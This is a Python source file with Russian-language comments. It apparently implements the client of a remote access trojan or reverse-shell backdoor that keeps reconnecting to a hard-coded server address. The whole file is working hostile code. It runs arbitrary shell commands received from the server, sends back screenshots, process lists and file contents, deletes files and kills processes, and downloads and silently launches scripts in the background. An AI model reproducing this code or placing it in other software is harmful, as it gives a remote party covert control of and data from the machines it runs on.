import socket
import subprocess
import os
import sys
import time

SERVER_IP = "192.168.100.3"  # Замените на адрес вашего сервера
SERVER_PORT = 5000
BUFFER_SIZE = 4096


def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        return output
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"


def is_windows():
    return os.name == 'nt'


def main():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
        except Exception:
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    break
                command = data.decode(errors='ignore')
                if not command:
                    break
                if command == "exit":
                    break

                # Обработка команды загрузки и одновременного запуска файла
                if command.startswith("upload_and_run:"):
                    filepath = command[len("upload_and_run:"):].strip()
                    try:
                        with open(filepath, "wb") as f:
                            while True:
                                chunk = s.recv(BUFFER_SIZE)
                                if chunk == b"__file_transfer_end__" or not chunk:
                                    break
                                f.write(chunk)
                        # После успешного сохранения запускаем скрипт автоматически
                        subprocess.Popen(
                            ['nohup', 'python3', filepath],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            shell=False,
                        )
                        s.send(f"Файл {os.path.basename(filepath)} получен и запущен.".encode())
                    except Exception as e:
                        s.send(f"Ошибка при сохранении/запуске файла: {e}".encode())
                    continue

                # Обработка проверки существования файла
                if command.startswith("check_file_exists:"):
                    filepath = command[len("check_file_exists:"):].strip()
                    if os.path.isfile(filepath):
                        s.send("exists".encode())
                    else:
                        s.send("not_exists".encode())
                    continue

                if command.startswith("cmd:"):
                    cmd = command[4:].strip()

                    if "nohup" in cmd:
                        try:
                            subprocess.Popen(cmd, shell=True,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                            time.sleep(0.5)
                            print("[DEBUG] Отправляю подтверждение запуска nohup команды")
                            s.send("Команда запущена через nohup".encode())
                        except Exception as e:
                            s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                        continue

                    if cmd.endswith('&'):
                        cmd_no_amp = cmd.rstrip('&').strip()
                        try:
                            subprocess.Popen(cmd_no_amp, shell=True,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
                            s.send("Команда выполнена в фоне".encode())
                        except Exception as e:
                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode())
                        continue

                    if cmd.startswith("cd"):
                        path = cmd[2:].strip()
                        if not path:
                            path = os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            s.send(f"Сменена директория на {os.getcwd()}".encode())
                        except Exception as e:
                            s.send(f"Ошибка смены директории: {e}".encode())

                    elif cmd.startswith("ls"):
                        path = cmd[2:].strip()
                        if not path or path == "~":
                            path = os.path.expanduser("~")
                        try:
                            entries = os.listdir(path)
                            dirs = []
                            files = []
                            for e in entries:
                                full_path = os.path.join(path, e)
                                if os.path.isdir(full_path):
                                    dirs.append(e + '/')
                                else:
                                    files.append(e)
                            result = "\n".join(sorted(dirs) + sorted(files))
                            s.send(result.encode())
                        except Exception:
                            s.send("Ошибка: у вас недостаточно прав для открытия данного файла/папки".encode())

                    else:
                        output = execute_command(cmd)
                        s.send(output.encode())

                elif command == "process_list":
                    if is_windows():
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode())

                elif command.startswith("kill:"):
                    pid = command[5:]
                    try:
                        if is_windows():
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode())
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode())

                elif command == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f_img:
                            while True:
                                chunk = f_img.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode())

                elif command.startswith("download:"):
                    filepath = command[len("download:"):].strip()
                    try:
                        filesize = os.path.getsize(filepath)
                        s.sendall(filesize.to_bytes(8, byteorder='big'))
                        with open(filepath, "rb") as f:
                            while True:
                                chunk = f.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                    except Exception as e:
                        error_msg = f"Ошибка при чтении файла: {e}"
                        err_bytes = error_msg.encode()
                        s.sendall(len(err_bytes).to_bytes(8, byteorder='big'))
                        s.sendall(err_bytes)

                elif command.startswith("upload:"):
                    filepath = command[len("upload:"):].strip()
                    try:
                        with open(filepath, "wb") as f:
                            while True:
                                chunk = s.recv(BUFFER_SIZE)
                                if chunk == b"__file_transfer_end__" or not chunk:
                                    break
                                f.write(chunk)
                        s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode())
                    except Exception as e:
                        s.send(f"Ошибка при сохранении файла: {e}".encode())

                elif command.startswith("delete:"):
                    filepath = command[len("delete:"):].strip()
                    try:
                        os.remove(filepath)
                        s.send(f"Файл {os.path.basename(filepath)} удалён.".encode())
                    except Exception as e:
                        s.send(f"Ошибка удаления файла: {e}".encode())

                else:
                    s.send("Неизвестная команда".encode())

        except Exception:
            pass
        finally:
            s.close()

        time.sleep(5)


if __name__ == "__main__":
    main()
